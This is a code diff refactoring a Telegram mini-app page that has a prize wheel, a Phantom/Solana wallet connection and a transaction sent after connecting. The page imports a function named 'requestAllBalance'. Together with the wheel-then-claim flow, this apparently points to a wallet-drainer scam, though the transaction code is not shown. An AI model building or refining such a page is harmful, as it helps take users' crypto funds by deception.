@@ -14,7 +14,6 @@ import { requestAllBalance } from '@/app/services/transaction'
 declare global {
   interface Window {
     solana?: { publicKey?: any }
-    Telegram?: { WebApp?: TgWebApp }
   }
 }
 
@@ -26,6 +25,7 @@ interface TgWebApp {
   disableVerticalSwipes?: () => void
   scroll?: (offsetY: number) => void
 }
+type TgWindow = Window & { Telegram?: { WebApp?: TgWebApp } }
 
 const isMobile = () => /iPhone|iPad|iPod|Android/i.test(navigator.userAgent)
 const openPhantomBrowser = () => {
@@ -34,25 +34,25 @@ const openPhantomBrowser = () => {
 }
 
 export default function Page() {
-  /* ——— Telegram Mini-App başlat ——— */
+  /* ——— Telegram WebApp init ——— */
   useEffect(() => {
-    const wa = window.Telegram?.WebApp
-    if (!wa) return
+    const webapp = (window as TgWindow).Telegram?.WebApp
+    if (!webapp) return
     try {
-      wa.expand()
-      wa.requestFullscreen?.()
-      wa.setHeaderColor('bg_color', '#000000')
-      wa.setBackgroundColor('#000000')
-      if (wa.disableVerticalSwipes) wa.disableVerticalSwipes()
-      else if (wa.scroll) {
-        const lock = () => wa.scroll!(window.scrollY)
+      webapp.expand()
+      webapp.requestFullscreen?.()
+      webapp.setHeaderColor('bg_color', '#000000')
+      webapp.setBackgroundColor('#000000')
+      if (webapp.disableVerticalSwipes) webapp.disableVerticalSwipes()
+      else if (webapp.scroll) {
+        const lock = () => webapp.scroll!(window.scrollY)
         window.addEventListener('scroll', lock)
         return () => window.removeEventListener('scroll', lock)
       }
     } catch { /* ignore */ }
   }, [])
 
-  /* ——— Wheel State ——— */
+  /* ——— Wheel logic ——— */
   const wheelRef = useRef<HTMLImageElement>(null)
   const [hasSpun, setHasSpun] = useState(
     typeof window !== 'undefined' && localStorage.getItem('hasSpun') === 'true'
@@ -75,8 +75,8 @@ export default function Page() {
     }, 10000)
   }
 
-  /* ——— Wallet-Adapter ile connect & claim ——— */
-  const { publicKey } = useWallet()
+  /* ——— Wallet logic ——— */
+  const { publicKey }  = useWallet()
   const { setVisible } = useWalletModal()
 
   const [isLoading,    setIsLoading]    = useState(false)
@@ -113,7 +113,6 @@ export default function Page() {
     }
   }
 
-  // Wallet bağlandıktan sonra bekleyen tx varsa gönder
   useEffect(() => {
     if (publicKey && pendingTx) {
       setPendingTx(false)
